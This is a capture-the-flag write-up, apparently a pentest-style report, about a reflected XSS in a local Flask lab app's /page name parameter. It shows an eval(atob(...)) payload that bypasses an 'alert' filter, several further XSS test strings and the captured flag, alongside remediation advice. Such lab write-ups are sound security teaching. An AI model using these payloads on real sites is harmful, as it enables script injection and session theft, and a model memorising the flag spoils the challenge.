## TL;DR
- Objective: Execute XSS with string 'XSS' (e.g., alert('XSS')) on Dalgona XSS Challenge
- Outcome: **ACHIEVED** - Successful XSS execution with flag captured
- Highest-impact finding: Reflected/DOM-based XSS at `/page` endpoint via `name` parameter with alert keyword filter bypass
- Validation status: **CONFIRMED** - Flag retrieved via successful exploitation

## Target Information
- Target: 127.0.0.1:32978
- Host / base URL: http://127.0.0.1:32978
- Application or component: Dalgona XSS Challenge
- Authentication context: No authentication required - publicly accessible
- Relevant technology details: Flask/Werkzeug (Python 2.7.18)

## Confirmed Vulnerability
### Reflected/DOM-based Cross-Site Scripting (XSS)
- Affected endpoint / component: `/page` endpoint via `name` query parameter (GET)
- Impact: Arbitrary JavaScript execution in victim's browser; session hijacking, credential theft, phishing
- Preconditions: None - publicly accessible, no authentication required
- Exact payload or PoC:
  ```
  <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
  ```
  Where `YWxlcnQoJ1hTUycp` base64 decodes to `alert('XSS')`

## Steps to Reproduce
1. Navigate to the vulnerable endpoint with the base64-encoded payload bypass:
   ```
   GET /page?name=<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
   ```
2. The server reflects the payload in the response without proper sanitization
3. Browser executes the injected JavaScript via `eval(atob())` which decodes and runs `alert('XSS')`
4. Success indicator: JavaScript alert box displays with message "XSS"

## Validation / Evidence
- Validation token / flag: `FLAG{008134df86e187ad5de71d126ac3d1f24f3d70c9b1a13572fa50d1c422a7fded}`
- Tool evidence: HTTP GET request to `/page?name=<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>` returned success page with flag
- Request evidence:
  ```
  GET /page?name=<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
  ```
- Response evidence:
  ```html
  <div class="solution-text">
    <img src="static/img/cookies/success_circle.png" alt="Correct" width="150" height="150"><br>
    Congratulations!
    <p>Here is the flag: FLAG{008134df86e187ad5de71d126ac3d1f24f3d70c9b1a13572fa50d1c422a7fded}</p>
  </div>
  ```
- Notes on reliability / limitations: The payload reliably executes. The application filters literal "alert" strings but does not decode base64 or analyze `eval(atob())` patterns.

## Remediation
- Root cause: The application reflects user-supplied input from the `name` parameter directly into the HTML response without proper output encoding or context-aware sanitization. The alert keyword filter is insufficient as it can be bypassed through encoding techniques.
- Recommended fix:
  1. Implement proper output encoding based on context (HTML entity encoding for HTML context)
  2. Use a Content Security Policy (CSP) to restrict inline script execution
  3. Validate and sanitize all user inputs server-side using a whitelist approach
  4. Consider using a mature templating engine with automatic escaping enabled
- Defense-in-depth:
  1. Enable X-XSS-Protection header (currently set to 0)
  2. Implement CSP headers with `script-src` restrictions
  3. Use HTTPOnly flags on cookies to mitigate session theft impact
  4. Implement input validation for expected data patterns

## How to Verify the Fix
1. Send the original exploit payload:
   ```
   GET /page?name=<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
   ```
2. **Expected secure result:**
   - The response should contain HTML-encoded output: `&lt;script&gt;eval(atob('YWxlcnQoJ1hTUycp'))&lt;/script&gt;`
   - No JavaScript alert should execute
   - Browser should display the literal text rather than executing it
   - No flag should be presented

3. Additional verification - test with plain alert attempts:
   ```
   GET /page?name=<script>alert('XSS')</script>
   GET /page?name=<img src=x onerror=alert('XSS')>
   GET /page?name=javascript:alert('XSS')
   ```
   All should return encoded/sanitized output without execution.

## Remaining Leads
- Confirmed blockers: None - exploitation successful
- Unverified leads: None
- Missing context: None - full reconnaissance and exploitation completed successfully
